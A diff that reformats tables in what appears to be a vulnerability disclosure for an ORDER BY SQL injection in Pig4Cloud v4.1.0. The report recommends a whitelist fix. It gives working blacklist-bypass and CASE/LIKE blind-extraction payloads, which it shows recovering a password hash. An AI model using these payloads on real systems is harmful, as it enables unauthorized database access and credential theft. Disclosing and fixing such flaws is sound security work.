@@ -16,11 +16,11 @@ Any authenticated user — including the lowest-privileged ordinary user — can
 
 **Verification completed** (self-built lab, Pig v4.1.0 + MySQL 8.4.5):
 
-| Verification item | Result |
-|---|---|
-| Parameter concatenated raw into SQL | ✅ Error echoes back `ORDER BY user_iddesc DESC` |
-| Blacklist bypass | ✅ `or` / `oR` / `select` all pass unfiltered |
-| Expression evaluation | ✅ `CASE` branch precisely controls the `ORDER BY` target column |
+| Verification item                                       | Result                                                       |
+| ------------------------------------------------------- | ------------------------------------------------------------ |
+| Parameter concatenated raw into SQL                     | ✅ Error echoes back `ORDER BY user_iddesc DESC`              |
+| Blacklist bypass                                        | ✅ `or` / `oR` / `select` all pass unfiltered                 |
+| Expression evaluation                                   | ✅ `CASE` branch precisely controls the `ORDER BY` target column |
 | **Full extraction of a field absent from the response** | ✅ **`password` matched 120/120 positions** (791 requests, 7 seconds) |
 
 This issue is classified as **SQL Injection (CWE-89)**.
@@ -41,10 +41,10 @@ issue.
 The same MyBatis-Plus ORDER BY injection class has been reported and fixed elsewhere
 using a **whitelist**, which is the remediation recommended below:
 
-| CVE | Project | Parameter | Fix |
-|---|---|---|---|
-| CVE-2020-16165 | SpringBlade | `ascs` / `desc` | Fixed after 2.7.1 |
-| CVE-2026-7060 | yu-picture | `sortField` | Regex whitelist |
+| CVE            | Project       | Parameter                  | Fix                           |
+| -------------- | ------------- | -------------------------- | ----------------------------- |
+| CVE-2020-16165 | SpringBlade   | `ascs` / `desc`            | Fixed after 2.7.1             |
+| CVE-2026-7060  | yu-picture    | `sortField`                | Regex whitelist               |
 | CVE-2026-63039 | Apache InLong | `orderField` / `orderType` | Whitelist validation in 2.4.0 |
 
 Pig4Cloud has no CVE for SQL injection to date; its three existing CVEs
@@ -104,11 +104,11 @@ private static final Pattern SQL_SYNTAX_PATTERN =
 
 There are three structural defects:
 
-| Defect | Description | Bypass |
-|---|---|---|
-| **Regex 1 requires a leading single quote** | `".*(or\|union\|--\|#\|/\*\|;)"` cannot trigger until a `'` appears | Send no single quote — comment-based filtering never activates |
+| Defect                                                      | Description                                                  | Bypass                                                       |
+| ----------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| **Regex 1 requires a leading single quote**                 | `".*(or\|union\|--\|#\|/\*\|;)"` cannot trigger until a `'` appears | Send no single quote — comment-based filtering never activates |
 | **Regex 2 enumerates only a limited set of function names** | It blacklists `if(`, `select(`, `substr(`, `concat(`, `sleep(`, etc. | `case(`, `when(`, `then(`, `left(`, `right(`, `ascii(`, `length(` are all unfiltered |
-| **Regex 2's `(and\|or)\s+.*` requires trailing whitespace** | A bare `or` does not match | Passing `or` alone passes straight through |
+| **Regex 2's `(and\|or)\s+.*` requires trailing whitespace** | A bare `or` does not match                                   | Passing `or` alone passes straight through                   |
 
 ### Bypass Strategy
 
@@ -135,6 +135,7 @@ pig-boot monolithic mode + MySQL 8.4.5 + Redis 7 + JDK 17
 ### Step 1: Confirm the Parameter Is Concatenated Raw into SQL
 
 **Request**:
+
 ```http
 GET /admin/user/page?current=1&size=5&descs=user_id%20desc HTTP/1.1
 Host: <host>:9999
@@ -159,11 +160,11 @@ The parameter value `user_id desc` was **concatenated verbatim** into `ORDER BY 
 
 ### Step 2: Confirm the Blacklist Bypass
 
-| Payload | Concatenated result | Response |
-|---|---|---|
-| `or` | `ORDER BY or DESC` | **500** — not filtered |
-| `oR` | `ORDER BY oR DESC` | **500** — case variant also unfiltered |
-| `select` | `ORDER BY select DESC` | 500 — not filtered |
+| Payload  | Concatenated result    | Response                               |
+| -------- | ---------------------- | -------------------------------------- |
+| `or`     | `ORDER BY or DESC`     | **500** — not filtered                 |
+| `oR`     | `ORDER BY oR DESC`     | **500** — case variant also unfiltered |
+| `select` | `ORDER BY select DESC` | 500 — not filtered                     |
 
 If the blacklist were effective, the parameter would be dropped by `filter()`, the query would fall back to the default sort, and the response would be `200`. It instead returns a SQL syntax error, proving the parameter reached the database.
 
@@ -174,19 +175,19 @@ If the blacklist were effective, the parameter would be dropped by `filter()`, t
 
 **Establish baselines**:
 
-| Request | Returned record IDs |
-|---|---|
-| `GET /admin/dict/item/page?current=1&size=4` | `2, 3, 13, 18` |
-| `&descs=id` | `100, 99, 98, 97` |
-| `&descs=dict_id` | `95, 96, 93, 94` |
+| Request                                      | Returned record IDs |
+| -------------------------------------------- | ------------------- |
+| `GET /admin/dict/item/page?current=1&size=4` | `2, 3, 13, 18`      |
+| `&descs=id`                                  | `100, 99, 98, 97`   |
+| `&descs=dict_id`                             | `95, 96, 93, 94`    |
 
 **Inject a CASE expression**:
 
-| Payload | Returned | Verdict |
-|---|---|---|
-| `case(1)when(1)then(id)else(dict_id)end` | `100,99,98,97` | ✅ THEN branch taken (= ordered by `id`) |
-| `case(1)when(0)then(id)else(dict_id)end` | `95,96,93,94` | ✅ ELSE branch taken (= ordered by `dict_id`) |
-| `case(1)when(2)then(id)else(dict_id)end` | `95,96,93,94` | ✅ Condition false, ELSE taken |
+| Payload                                  | Returned       | Verdict                                      |
+| ---------------------------------------- | -------------- | -------------------------------------------- |
+| `case(1)when(1)then(id)else(dict_id)end` | `100,99,98,97` | ✅ THEN branch taken (= ordered by `id`)      |
+| `case(1)when(0)then(id)else(dict_id)end` | `95,96,93,94`  | ✅ ELSE branch taken (= ordered by `dict_id`) |
+| `case(1)when(2)then(id)else(dict_id)end` | `95,96,93,94`  | ✅ Condition false, ELSE taken                |
 
 The branch taken by the CASE expression **precisely determines** the `ORDER BY` target column — proving the expression is genuinely evaluated.
 
@@ -196,11 +197,11 @@ The branch taken by the CASE expression **precisely determines** the `ORDER BY` 
 
 Place a database function in the expression position and read its return value from the branch difference:
 
-| Payload | Returned | Verdict |
-|---|---|---|
-| `case(length(version()))when(5)then(id)else(dict_id)end` | `100,99,98,97` | ✅ `length(version()) = 5` |
-| `case(ascii(version()))when(56)then(id)else(dict_id)end` | `100,99,98,97` | ✅ First character ASCII 56 = `'8'` |
-| `case(database())when(0x706967)then(id)else(dict_id)end` | `100,99,98,97` | ✅ `database() = 'pig'` |
+| Payload                                                     | Returned       | Verdict                                         |
+| ----------------------------------------------------------- | -------------- | ----------------------------------------------- |
+| `case(length(version()))when(5)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ `length(version()) = 5`                       |
+| `case(ascii(version()))when(56)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ First character ASCII 56 = `'8'`              |
+| `case(database())when(0x706967)then(id)else(dict_id)end`    | `100,99,98,97` | ✅ `database() = 'pig'`                          |
 | `case(version())when(0x382e342e35)then(id)else(dict_id)end` | `100,99,98,97` | ✅ Full-string exact match `version() = '8.4.5'` |
 
 **Extracted results**:
@@ -235,11 +236,11 @@ ORDER BY case(ascii(right(left(version() DESC, 1) DESC, 1)))when(56)...end DESC
 
 **Primitives verified working on v4.1.0**:
 
-| Primitive | Form |
-|---|---|
-| Length test | `case(length(expr))when(N)...` |
-| First-character ASCII | `case(ascii(expr))when(N)...` |
-| Full-string exact match | `case(expr)when(0x<hex>)...` |
+| Primitive               | Form                           |
+| ----------------------- | ------------------------------ |
+| Length test             | `case(length(expr))when(N)...` |
+| First-character ASCII   | `case(ascii(expr))when(N)...`  |
+| Full-string exact match | `case(expr)when(0x<hex>)...`   |
 
 **Measured as unusable**: searched CASE (`case when <cond> then ... end`, rejected by the Druid parser), `left()` / `right()` (contain commas), and arithmetic operations.
 
@@ -247,11 +248,11 @@ ORDER BY case(ascii(right(left(version() DESC, 1) DESC, 1)))when(56)...end DESC
 
 Reproduction revealed that **not all CASE discriminators are equally reliable**; always calibrate empirically before submitting:
 
-| Primitive | Reliability | Measured evidence |
-|---|---|---|
-| `case(expr)when(0x<hex>)` **full-string exact match** | ✅ **Reliable** | `database()='pig'` and `version()='8.4.5'` both matched correctly |
-| `case(ascii(expr))when(N)` **first character** | ✅ **Reliable** | `ascii(version())=56('8')`, `ascii(database())=112('p')` |
-| `case(length(expr))when(N)` **length test** | ⚠️ **Off by one** | `version()` true length 5 → matched 5 ✅; `user()` true length 14 → **matched 15** ❌ |
+| Primitive                                             | Reliability      | Measured evidence                                            |
+| ----------------------------------------------------- | ---------------- | ------------------------------------------------------------ |
+| `case(expr)when(0x<hex>)` **full-string exact match** | ✅ **Reliable**   | `database()='pig'` and `version()='8.4.5'` both matched correctly |
+| `case(ascii(expr))when(N)` **first character**        | ✅ **Reliable**   | `ascii(version())=56('8')`, `ascii(database())=112('p')`     |
+| `case(length(expr))when(N)` **length test**           | ⚠️ **Off by one** | `version()` true length 5 → matched 5 ✅; `user()` true length 14 → **matched 15** ❌ |
 
 **Observed behaviour**: `length()` returns an integer, and the result of comparing it
 against a `WHEN` operand does not reliably match the true string length — the
@@ -260,6 +261,7 @@ during testing; the observation is reported as measured, without asserting a
 mechanism.
 
 **Recommendations**:
+
 - **Length tests are indicative only** and must not be the sole basis for determining string length.
 - **Full string extraction should use hex full-string exact matching** (enumerating candidate values), or use `ascii()` to read the first character purely to confirm reachability.
 - Any PoC should be calibrated against an environment with **known ground-truth values** before formal submission.
@@ -303,11 +305,11 @@ The stripped set **does not include `LIKE` or `_`**, and `( )` survive (no space
 case((hex(password))LIKE(0x<hex>%))when(1)then(user_id)else(phone)end
 ```
 
-| Element | Role |
-|---|---|
-| `hex(expr)` | Convert the target to hexadecimal (charset limited to `0-9a-f`) |
-| `LIKE 0x<hex>%` | Prefix matching (`0x` avoids the stripped single quote) |
-| `_` | Skips a position occupied by a filtered character |
+| Element         | Role                                                         |
+| --------------- | ------------------------------------------------------------ |
+| `hex(expr)`     | Convert the target to hexadecimal (charset limited to `0-9a-f`) |
+| `LIKE 0x<hex>%` | Prefix matching (`0x` avoids the stripped single quote)      |
+| `_`             | Skips a position occupied by a filtered character            |
 
 #### Extraction Result (120/120 positions)
 
@@ -316,11 +318,11 @@ extracted:    24326124313024632f41653070526a4a744d5a6733426e7656704f2e65494b3657
 ground truth: 24326124313024632f41653070526a4a744d5a6733426e7656704f2e65494b3657595756624b547a716764793361665237772e76642e7869334d6779
 ```
 
-| Metric | Result |
-|---|---|
-| Length | **120 / 120 exact match** |
+| Metric               | Result                           |
+| -------------------- | -------------------------------- |
+| Length               | **120 / 120 exact match**        |
 | Position-by-position | **✅ all match, no placeholders** |
-| Requests / duration | 791 requests / 7 seconds |
+| Requests / duration  | 791 requests / 7 seconds         |
 
 **Conclusion: a field absent from the API response can be fully extracted.**
 
@@ -335,11 +337,11 @@ ground truth: 24326124313024632f41653070526a4a744d5a6733426e7656704f2e65494b3657
 
 #### Preconditions (CVSS Determination)
 
-| Request | Response |
-|---|---|
-| Without `Authorization` | `{"msg":"token expired", ...}` |
-| Forged token | `{"msg":"token expired","data":"invalid"}` |
-| With valid token | `200` normal response |
+| Request                 | Response                                   |
+| ----------------------- | ------------------------------------------ |
+| Without `Authorization` | `{"msg":"token expired", ...}`             |
+| Forged token            | `{"msg":"token expired","data":"invalid"}` |
+| With valid token        | `200` normal response                      |
 
 → **Any valid login credential is required → CVSS `PR:L`**
 
